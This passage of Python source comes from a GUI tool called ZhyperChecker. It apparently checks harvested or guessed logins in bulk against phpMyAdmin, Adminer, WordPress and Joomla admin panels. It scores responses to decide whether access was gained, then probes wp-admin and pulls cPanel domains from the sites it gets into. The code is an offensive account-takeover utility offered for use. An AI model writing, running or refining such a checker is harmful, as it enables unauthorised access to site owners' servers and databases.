                        self.log(f"  PHPMYADMIN: ✓ VALID! (dashboard score {dashboard_score})", "green")
                    return (True, f"Authenticated (score {dashboard_score})")
                
                dashboard_urls = [
                    'navigation.php',
                    'server_databases',
                    'server_privileges',
                    'main.php',
                ]
                
                has_dashboard_url = any(pattern in final_url for pattern in dashboard_urls)
                
                if has_dashboard_url and cookies:
                    if self.debug_mode.get():
                        self.log(f"  PHPMYADMIN: ✓ VALID! (dashboard URL + cookies)", "green")
                    return (True, "Authenticated (dashboard URL)")
                
                if dashboard_score >= 5 and cookies:
                    if self.debug_mode.get():
                        self.log(f"  PHPMYADMIN: ✓ VALID! (medium score {dashboard_score} + cookies)", "green")
                    return (True, f"Authenticated (score {dashboard_score})")
                
                login_indicators = [
                    'name="pma_username"',
                    'name="pma_password"',
                    'log in',
                    'username:',
                    'password:',
                ]
                
                login_count = sum(1 for ind in login_indicators if ind in txt_lower)
                
                if login_count >= 3:
                    if self.debug_mode.get():
                        self.log(f"  PHPMYADMIN: ✗ Still on login page ({login_count} login indicators)", "red")
                    return (False, "Still on login page")
                
                if self.debug_mode.get():
                    self.log(f"  PHPMYADMIN: ✗ Cannot verify (score {dashboard_score}, login indicators {login_count})", "red")
                return (False, "Cannot verify login")
            
            elif cms == 'adminer':
                final_url = resp.url.lower()
                txt_lower = txt.lower()
                
                if self.debug_mode.get():
                    self.log(f"  ADMINER: Improved validation starting...", "cyan")
                    self.log(f"  ADMINER: Status={status_code}, URL={final_url[:60]}", "cyan")
                
                adminer_dashboard = {
                    'select database': 3,
                    'create database': 3,
                    'alter database': 2,
                    'database has been': 2,
                    
                    'sql command': 3,
                    'execute': 2,
                    
                    'select table': 2,
                    'create table': 2,
                    'show structure': 2,
                    
                    'logout': 3,
                    
                    'adminer': 1,
                    'jakub vrana': 1,
                }
                
                dashboard_score = 0
                found_indicators = []
                
                for indicator, points in adminer_dashboard.items():
                    if indicator in txt_lower:
                        dashboard_score += points
                        found_indicators.append(f"{indicator}({points})")
                
                if self.debug_mode.get():
                    self.log(f"  ADMINER: Dashboard score: {dashboard_score}", "cyan")
                    if found_indicators:
                        self.log(f"  ADMINER: Found: {', '.join(found_indicators[:5])}", "gray")
                
                if dashboard_score >= 6:
                    if self.debug_mode.get():
                        self.log(f"  ADMINER: ✓ VALID! (dashboard score {dashboard_score})", "green")
                    return (True, f"Authenticated (score {dashboard_score})")
                
                has_logout = 'logout' in txt_lower and ('<a' in txt_lower or 'href' in txt_lower)
                
                if has_logout and cookies:
                    if self.debug_mode.get():
                        self.log(f"  ADMINER: ✓ VALID! (logout link + cookies)", "green")
                    return (True, "Authenticated (logout link)")
                
                login_indicators = [
                    'auth[username]',
                    'auth[password]',
                    'auth[driver]',
                    'auth[server]',
                    'login to database',
                ]
                
                login_count = sum(1 for ind in login_indicators if ind in txt_lower)
                
                if login_count >= 3:
                    if self.debug_mode.get():
                        self.log(f"  ADMINER: ✗ Still on login form ({login_count} login fields)", "red")
                    return (False, "Still on login form")
                
                if self.debug_mode.get():
                    self.log(f"  ADMINER: ✗ Cannot verify (score {dashboard_score}, login indicators {login_count})", "red")
                return (False, "Cannot verify login")
            
            return (False, "Validation not implemented")
            
        except Exception as e:
            return (False, f"Error: {str(e)[:50]}")

    def validate_wordpress_enhanced(self, session, url, resp):
        try:
            import re
            
            txt = resp.text
            final_url = resp.url.lower()
            cookies_dict = session.cookies.get_dict()
            
            if self.debug_mode.get():
                self.log(f"  WORDPRESS: Status={resp.status_code}, URL={resp.url[:60]}", "cyan")
                self.log(f"  WORDPRESS: Redirects={len(resp.history)}", "cyan")
            
            is_in_wp_admin = bool(re.search(r'/wp-admin/?', final_url))
            
            if self.debug_mode.get():
                self.log(f"  WORDPRESS: Regex /wp-admin check: {is_in_wp_admin}", "cyan")
            
            if 'wp-login.php' not in final_url:
                valid_destinations = [
                    '/wp-admin/',
                    '/my-account/',
                    '/account/',
                    '/dashboard/',
                    '/profile/',
                ]
                
                is_valid_dest = any(dest in final_url for dest in valid_destinations)
                is_valid_regex = is_in_wp_admin
                
                if is_valid_dest or is_valid_regex:
                    if self.debug_mode.get():
                        self.log(f"  WORDPRESS: ✓ Redirected away from login - VALID!", "green")
                    return (True, session)
                
                if resp.history:
                    if self.debug_mode.get():
                        self.log(f"  WORDPRESS: ✓ Redirected to {final_url[:40]} - VALID!", "green")
                    return (True, session)
            
            if 'wp-login.php' in final_url:
                error_patterns = [
                    'incorrect password',
                    'invalid username',
                    '<div id="login_error">',
                    'class="message error"',
                    'authentication failed',
                    'wrong username or password',
                    '<strong>error</strong>',
                ]
                
                txt_lower = txt.lower()
                for error_pattern in error_patterns:
                    if error_pattern in txt_lower:
                        if self.debug_mode.get():
                            self.log(f"  WORDPRESS: ✗ Error: {error_pattern}", "red")
                        return (False, "Login error detected")
                
                login_form_indicators = ['name="log"', 'name="pwd"', 'name="wp-submit"']
                login_count = sum(1 for ind in login_form_indicators if ind in txt_lower)
                
                if login_count >= 3:
                    if self.debug_mode.get():
                        self.log(f"  WORDPRESS: ✗ Still on login page with form", "red")
                    return (False, "Still on login page")
            
            txt_lower = txt.lower()
            
            admin_indicators = {
                'howdy': 5,
                'dashboard': 3,
                'wp-admin-bar': 2,
                'adminmenu': 2,
                'dashboard-widgets': 2,
                'wp-admin/index.php': 1,
                'wp-admin/css/': 1,
                'wp-admin/js/': 1,
                'wp-login.php?action=logout': 2,
                '_wpnonce': 1,
                'wp_nonce': 1,
                'dashicons': 2,
                'admin-ajax.php': 2,
                'load-scripts.php': 2,
                'load-styles.php': 2,
                'screen-options': 3,
            }
            
            admin_score = 0
            found_indicators = []
            
            for indicator, score in admin_indicators.items():
                if indicator in txt:
                    admin_score += score
                    found_indicators.append(indicator)
            
            if self.debug_mode.get():
                self.log(f"  WORDPRESS: Fallback - Admin score: {admin_score}", "cyan")
            
            if 'howdy' in txt_lower or 'dashboard' in txt_lower:
                threshold = 3
            else:
                threshold = 4
            
            if admin_score >= threshold:
                if self.debug_mode.get():
                    self.log(f"  WORDPRESS: ✓ Admin confirmed (score: {admin_score})", "green")
                return (True, session)
            
            wp_cookies = [k for k in cookies_dict.keys() if 'wordpress_logged_in' in k.lower()]
            wp_auth_cookies = [k for k in cookies_dict.keys() if 'wordpress' in k.lower() and 'auth' in k.lower()]
            
            if wp_cookies or wp_auth_cookies:
                if self.debug_mode.get():
                    self.log(f"  WORDPRESS: ✓ WP cookies found", "green")
                
                if admin_score >= 2:
                    return (True, session)
            
            if is_in_wp_admin and 'wp-login.php' not in final_url:
                if admin_score >= 1:
                    if self.debug_mode.get():
                        self.log(f"  WORDPRESS: ✓ In wp-admin (regex) with indicators", "green")
                    return (True, session)
            
            if admin_score >= 1 or wp_cookies:
                try:
                    admin_url = url.rstrip('/') + '/wp-admin/'
                    admin_resp = session.get(admin_url, timeout=8, allow_redirects=True)
                    
                    if 'wp-login.php' not in admin_resp.url.lower():
                        admin_txt = admin_resp.text
                        quick_indicators = ['wp-admin-bar', 'adminmenu', 'dashboard-widgets', 'howdy']
                        found_quick = sum(1 for ind in quick_indicators if ind in admin_txt.lower())
                        
                        if found_quick >= 1:
                            if self.debug_mode.get():
                                self.log(f"  WORDPRESS: ✓ Direct admin access successful", "green")
                            return (True, session)
                
                except Exception as e:
                    if self.debug_mode.get():
                        self.log(f"  WORDPRESS: Admin test error: {str(e)[:40]}", "yellow")
            
            if self.debug_mode.get():
                self.log(f"  WORDPRESS: ✗ Could not confirm valid login", "red")
            
            return (False, "Login validation failed")
            
        except Exception as e:
            if self.debug_mode.get():
                self.log(f"  WORDPRESS: Validation error: {str(e)[:50]}", "red")
            return (False, f"Validation error: {str(e)[:50]}")

    def validate_joomla_final(self, session, url, resp):
        try:
            status_code = resp.status_code
            final_url = resp.url.lower()
            txt = resp.text
            txt_lower = txt.lower()
            cookies = session.cookies.get_dict()
            
            if status_code == 403:
                return (False, "403 Forbidden")
            if status_code == 404:
                return (False, "404 Not Found")
            if status_code == 405:
                return (False, "405 Method Not Allowed")
            if status_code >= 500:
                return (False, f"{status_code} Server Error")
            
            errors = [
                'nome utente e password non corretti',
                'incorrect password',
                'invalid username',
                'authentication failed',
                'login incorrect',
            ]
            
            for error in errors:
                if error in txt_lower:
                    pos = txt_lower.find(error)
                    context = txt_lower[max(0, pos-500):pos+100]
                    
                    if 'display:none' not in context and 'visibility:hidden' not in context:
                        return (False, "Invalid credentials")
            
            if resp.history:
                if '/administrator/' not in final_url:
                    if final_url.endswith('/') or final_url.endswith('/index.php'):
                        return (False, "Redirected to homepage")
                    return (False, "Unexpected redirect")
            
            if not cookies:
                return (False, "No session cookies")
            
            has_username = 'name="username"' in txt_lower
            has_password = 'name="passwd"' in txt_lower
            has_form_fields = has_username and has_password
            
            is_login_form = False
            
            if has_form_fields:
                username_pos = txt_lower.find('name="username"')
                
                if username_pos != -1:
                    context_start = max(0, username_pos - 500)
                    context_end = min(len(txt_lower), username_pos + 500)
                    form_context = txt_lower[context_start:context_end]
                    
                    login_indicators = [
                        'option=com_login',
                        'task=login',
                        'type="submit"',
                        'value="log in"',
                        'id="login-form"',
                        'class="login-form',
                        'action="index.php"',
                    ]
                    
                    login_count = sum(1 for ind in login_indicators if ind in form_context)
                    
                    if self.debug_mode.get():
                        self.log(f"  JOOMLA: Form context check: {login_count}/7 login indicators", "cyan")
                    
                    if login_count >= 3:
                        is_login_form = True
                    
                    if 'log in</button>' in form_context or 'log in</a>' in form_context:
                        is_login_form = True
                    
                    if self.debug_mode.get():
                        self.log(f"  JOOMLA: is_login_form={is_login_form}", "cyan")
            
            score = 0
            reasons = []
            
            if is_login_form:
                score -= 15
                reasons.append("login_form(-15)")
            elif has_form_fields:
                score -= 5
                reasons.append("other_form(-5)")
            
            
            if 'task=logout' in txt_lower or 'option=com_login&task=logout' in txt_lower:
                score += 25
                reasons.append("logout(+25)")
            
            dashboard_texts = [
                'control panel',
                'pannello di controllo',
                'control-panel',
            ]
            
            for dash_text in dashboard_texts:
                if dash_text in txt_lower:
                    score += 20
                    reasons.append(f"{dash_text[:10]}(+20)")
                    break
            
            admin_specific = [
                'joomla! administration',
                'administration control panel',
            ]
            
            for admin_txt in admin_specific:
                if admin_txt in txt_lower:
                    
                    pos = txt_lower.find(admin_txt)
                    context = txt_lower[max(0, pos-200):pos+200]
                    
                    is_in_header = (
                        '<title>' in context or 
                        '<h1>' in context or
                        'login-form' in context or
                        'name="username"' in context
                    )
                    
                    if is_in_header:
                        score += 5
                        reasons.append(f"{admin_txt[:10]}(+5,header)")
                    else:
                        score += 15
                        reasons.append(f"{admin_txt[:10]}(+15)")
                    break
            
            dashboard_components = [
                'com_cpanel',
                'class="cpanel',
                'id="cpanel"',
            ]
            
            for component in dashboard_components:
                if component in txt_lower:
                    score += 12
                    reasons.append(f"{component[:8]}(+12)")
                    break
            
            if 'quick-icons' in txt_lower or 'quickicons' in txt_lower or 'icon-48-' in txt_lower:
                score += 10
                reasons.append("icons(+10)")
            
            admin_menu = [
                'id="menu"',
                'id="sidebar"',
                'class="sidebar',
                'id="adminform"',
            ]
            
            for menu in admin_menu:
                if menu in txt_lower:
                    score += 10
                    reasons.append("menu(+10)")
                    break
            
            admin_pages = [
                'site administrator',
                'user manager',
                'article manager',
            ]
            
            admin_page_count = 0
            for page in admin_pages:
                if page in txt_lower:
                    admin_page_count += 1
                    if admin_page_count <= 2:
                        score += 5
                        reasons.append(f"{page[:6]}(+5)")
            
            if self.debug_mode.get():
                self.log(f"  JOOMLA: Score={score} | {', '.join(reasons)}", "cyan")
            
            if score >= 15:
                return (True, "Authenticated")
            else:
                return (False, "Login form present")
            
        except Exception as e:
            return (False, f"Error: {str(e)[:50]}")

    def _extract_domains_safe(self, session, base_url, html_text=""):
        try:
            if not self.domain_extractor:
                self.domain_extractor = CPanelDomainExtractor(
                    debug_mode=self.debug_mode.get(),
                    log_callback=self.log
                )
            
            domains = self.domain_extractor.extract_domains(
                session=session,
                base_url=base_url,
                html_text=html_text
            )
            
            return domains
            
        except Exception as e:
            if self.debug_mode.get():
                self.log(f"  DOMAIN: Extraction failed - {str(e)[:50]}", "yellow")
            return []


if __name__ == "__main__":
    root = tk.Tk()
    app = ZhyperChecker(root)
    root.mainloop()